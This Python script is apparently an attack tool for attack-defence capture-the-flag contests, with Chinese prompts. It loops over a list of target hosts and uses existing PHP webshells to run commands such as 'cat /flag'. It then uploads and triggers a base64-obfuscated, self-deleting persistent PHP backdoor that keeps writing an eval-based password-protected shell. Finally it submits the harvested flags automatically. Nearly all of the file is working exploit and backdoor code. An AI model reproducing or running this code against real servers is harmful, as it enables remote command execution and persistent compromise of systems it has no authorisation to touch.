#!/usr/bin/python3
#By purplet
import requests
def get_post_Flag(shell_url):
    try:
        if(int(type)==1):
            res=requests.get(shell_url,payload,timeout=2)
        else:
            res=requests.post(shell_url,payload,timeout=2)
        if res.status_code == 200:
            result = shell_url + " connect shell sucess,flag is "+res.text
            print(result)
            flag.write(res.text+'\n')
        else:
            print(shell_url+" Shell 404")
    except:
        print(shell_url + " connect shell fail")
        
def submit_Flag(flag_url):
    try:
        res=requests.post(flag_url,data,timeout=1)
        if res.status_code == 200:
            print("submit flag success--")
        else:
            print("submit flag fail")
    except:
        print(flag_url + " connect fail")

def prepare_get_post():
    global payload
    payload = {passwd: "system('cat /flag');"}
    #payload = {passwd: "system('curl http://flag.host/getflag.php');"}#需修改
    #payload =  {passwd: 'cat /flag'}
    for i in url_head:
        url_head1 = i.strip()+'/admin/file.php'#修改为不死马路径
        shell_url = i.strip()+shell_addr
        get_post_Flag(shell_url)
        submit_undead_ma(shell_url)
        activate_undead_ma(url_head1)
    flag.close()
    first_flag = open('firstround_flag.txt',"r")
    first_flag_list = first_flag.readlines()
    flag_server = input("[+] 请输入提交flag的网址Input example:http://192.168.194.147:9090/\n")
    token = input("[+] 请输入自己队伍的token：")
    for j in first_flag_list:
        global data
        data = {
                'flag':j.strip(),
                'token':token
        }
        submit_Flag(flag_server)

def submit_undead_ma(shell_url):
    ma = "file_put_contents('/var/www/html/admin/file.php',base64_decode('PD9waHAgIA0KICAgIHNldF90aW1lX2xpbWl0KDApOyAgDQogICAgaWdub3JlX3VzZXJfYWJvcnQoMSk7Ly/lrp7njrDov5vnqIvov5DooYwgIA0KICAgIHVubGluayhfX0ZJTEVfXyk7ICANCiAgICB3aGlsZSgxKXsgIA0KICAgICAgICBmaWxlX3B1dF9jb250ZW50cygnLmNvbmZpZy5waHAnLCc8P3BocCBpZihtZDUoJF9QT1NUWyJwYXNzIl0pPT0iMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiKXtAZXZhbCgkX1BPU1RbamR0bV0pO30gPz4nKTsgIA0KICAgICAgICB1c2xlZXAoMTAwKTsgIA0KICAgIH0'));"#需修改绝对路径
    data1 = {passwd:ma}
    try:
        if(int(type)==1):
            res=requests.get(shell_url,data1,timeout=2)
        else:
            res=requests.post(shell_url,data1,timeout=2)
        if res.status_code == 200:
            result = shell_url + " upload undead_ma success "
            print(result)
        else:
            print(shell_url+" upload undead_ma fail")
    except:
        print(shell_url + " connect shell fail")

def activate_undead_ma(url_head1):
    try:
        res = requests.get(url_head1,timeout=2)
        print(url_head1+"[-] 不死马激活失败")
    except:
        print(url_head1+"[+] 不死马激活成功")
        
if __name__ == '__main__':
    print('''前提：需结合“IP扫描.py”使用
该脚本功能1：可利用GET或POST型一句话木马实现开场第一波flag的获取
该脚本功能2：自动提交flag
该脚本功能3：通过预留后门上传不死马并触发
该脚本功能4：可实现后期的蹭马利用
    ''')
    file = open('ip.txt','r')
    url_head = file.readlines()
    flag=open("firstround_flag.txt","w")
    print("[+] 请输入shell地址Input example:/footer.php")
    shell_addr = input()
    print("[+] 请输入木马密码Input example：shell")
    global passwd
    passwd = input("")
    print("[+] 请选择木马类型 1.GET 2.POST")
    global type
    type = input("")
    prepare_get_post()
    